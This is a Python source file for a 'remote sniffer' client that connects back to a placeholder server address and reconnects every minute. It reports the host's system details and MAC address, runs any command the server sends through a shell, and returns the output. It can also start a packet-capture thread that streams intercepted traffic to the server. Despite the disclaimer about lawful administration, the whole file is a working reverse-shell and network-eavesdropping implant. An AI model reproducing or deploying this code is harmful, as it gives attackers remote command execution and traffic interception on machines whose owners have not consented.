#Created by Vasto Boy

#Disclaimer: This remote packet sniffer should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
import os
import json
import time
import socket
import datetime
import platform
import threading
import subprocess
from sniffer import RemoteSniffer
from getmac import get_mac_address as gma



class RemoteSnifferClient:

    def __init__(self, host, port1, port2):
        self.host = host
        self.port1 = port1
        self.port2 = port2
        self.sock1 = None
        self.sock2 = None
        self.sniffer = RemoteSniffer(self.host)


    # format text to bold and blue 
    def convert_text_bold_blue(self, text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m"
            return f"{BOLD}{COLOR}{text}{RESET}"



    # tries to connect back to the server
    def establish_connection(self):

        while True:
            try:
                self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock1.connect((self.host, self.port1)) # connect back to server on port 1
                print(f"[+]Session 1 has started on port {self.port1}")

                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock2.connect((self.host, self.port2)) # connect back to server port 2
                print(f"[+]Session 2 has started on port {self.port2}")
                break

            except socket.error as err:
                print(err)
                time.sleep(60) # try to reconnect after 60 seconds

        # send system info
        self.send_system_info()


        # create sniffer threads
        capture_thread = None
        capture_handle_thread = None



        # Listen for commands from server
        while True:
            cmd = self.sock1.recv(4096).decode()

            if cmd == " ":
                response = f"{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                self.sock1.send(response.encode())


            elif cmd[:2] == 'cd': 
                try:
                    os.chdir(cmd[3:])
                    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = result.stdout.read() + result.stderr.read()
                    output_data = output.decode()

                    if "The system cannot find the path specified." in output_data:
                        output_data = "\n"

                    response = f"{output_data}\n{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                    self.sock1.send(response.encode())
                
                except (FileNotFoundError, IOError):
                    error_message = "Directory does not exist!!! \n"
                    response = f"{error_message}{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                    self.sock1.send(response.encode())


            elif cmd == "start sniffer":
                try:
                     # create sniffer threads
                    capture_thread = threading.Thread(target=self.sniffer.main)
                    capture_handle_thread = threading.Thread(target=self.sniffer.process_captures, args=(self.sock2,))

                    capture_thread.start()
                    capture_handle_thread.start()

                    response = f"[+]Packet Sniffer has been started!!!\n{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                    self.sock1.send(response.encode())
                   
                except Exception as e:
                    error_message = f"{e} \n"
                    response = f"{error_message}{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                    self.sock1.send(response.encode())

            elif cmd == "stop sniffer":
                try:
                    self.sniffer.stop_thread()
                    capture_thread.join()
                    capture_handle_thread.join()


                    response = f"[+]Packet Sniffer has stopped!!!\n{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                    self.sock1.send(response.encode())

                    self.sniffer.resume()
                   
                except Exception as e:
                    error_message = f"{e} \n"
                    response = f"{error_message}{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                    self.sock1.send(response.encode())

            else:
                try:
                    terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()

                    output_data = terminal_output.decode() + "\n" + self.convert_text_bold_blue("Sniffer: ") + os.getcwd() + ": "
                    self.sock1.send(output_data.encode()) 

                except Exception as e:
                    error_message = f"{e}\n{self.convert_text_bold_blue('Sniffer: ')}{os.getcwd()}: "
                    self.sock1.send(error_message.encode()) 



    # returns client system information
    def get_platform_info(self):
        sys_info = {
            "system": platform.uname().system,
            "node": platform.uname().node,
            "mac_address": gma(),
            "release": platform.uname().release,
            "version": platform.uname().version,
            "machine": platform.uname().machine,
            "date_today": str(datetime.date.today()),
            "time_now": str(datetime.datetime.now().time())
        }
        
        return sys_info



    # send client info back to server
    def send_system_info(self):
        system_info = self.get_platform_info()
        system_info_string = json.dumps(system_info)
        self.sock1.send(system_info_string.encode())



    def start(self):
        self.establish_connection()




sniffer = RemoteSnifferClient("IP-ADDRESS", "PORT-1", "PORT-2")
sniffer.start()

